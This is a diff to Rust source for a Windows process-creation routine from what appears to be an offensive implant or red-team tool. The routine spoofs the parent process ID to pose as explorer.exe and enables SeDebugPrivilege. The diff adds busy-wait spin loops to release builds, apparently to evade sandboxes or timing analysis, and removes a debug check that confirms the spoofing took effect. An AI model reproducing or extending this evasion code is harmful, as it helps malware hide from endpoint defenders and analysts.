@@ -226,6 +226,7 @@ pub unsafe fn create_process(target_program: &str, creation_flags: u32) -> Resul
 
     let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
 
+
     // Attempt to spoof PPID with explorer.exe
     #[cfg(feature = "ppid_spoofing")]
     {
@@ -249,9 +250,13 @@ pub unsafe fn create_process(target_program: &str, creation_flags: u32) -> Resul
                         #[cfg(feature = "debug")]
                         crate::utils::print_message(&format!("Failed to enable SeDebugPrivilege: {}", GetLastError()));
                     }
+                    #[cfg(not(feature = "debug"))]
+                    for _ in 0..1000000 { core::hint::spin_loop(); }
                 } else {
                     #[cfg(feature = "debug")]
                     crate::utils::print_message(&format!("LookupPrivilegeValueW failed: {}", GetLastError()));
+                    #[cfg(not(feature = "debug"))]
+                    for _ in 0..1000000 { core::hint::spin_loop(); }
                 }
                 CloseHandle(token);
             } else {
@@ -319,45 +324,12 @@ pub unsafe fn create_process(target_program: &str, creation_flags: u32) -> Resul
                             #[cfg(feature = "debug")]
                             crate::utils::print_message("PPID spoofing successful");
 
-                            // Verify actual PPID
-                            #[cfg(feature = "debug")]
-                            {
-                                use core::ffi::c_void;
-                                let mut pbi = PROCESS_BASIC_INFORMATION {
-                                    exit_status: 0,
-                                    peb_base_address: 0,
-                                    affinity_mask: 0,
-                                    base_priority: 0,
-                                    unique_process_id: 0,
-                                    inherited_from_unique_process_id: 0,
-                                };
-                                let mut return_len: u32 = 0;
-                                let status = api::query_information_process(
-                                    process_info.hProcess as isize,
-                                    0u32, // ProcessBasicInformation
-                                    &mut pbi as *mut _ as *mut c_void,
-                                    std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
-                                    &mut return_len
-                                );
-                                match status {
-                                    Ok(s) if s >= 0 => {
-                                        if pbi.inherited_from_unique_process_id as u32 == parent_pid {
-                                            crate::utils::print_message("PPID spoofing verified: actual PPID matches expected");
-                                        } else {
-                                            crate::utils::print_message(&format!("PPID spoofing failed: expected PPID {}, actual PPID {}", parent_pid, pbi.inherited_from_unique_process_id));
-                                        }
-                                    }
-                                    Ok(s) => {
-                                        crate::utils::print_message(&format!("NtQueryInformationProcess returned negative status: {:#x}", s));
-                                    }
-                                    Err(e) => {
-                                        crate::utils::print_message(&format!("Failed to query PPID: {}", e));
-                                    }
-                                }
-                            }
-
+                            #[cfg(not(feature = "debug"))]
+                            for _ in 0..1000000 { core::hint::spin_loop(); }
                             DeleteProcThreadAttributeList(attr_list_ptr);
                             CloseHandle(parent_handle);
+                            #[cfg(not(feature = "debug"))]
+                            for _ in 0..1000000 { core::hint::spin_loop(); }
                             return Ok(process_info);
                         } else {
                             #[cfg(feature = "debug")]
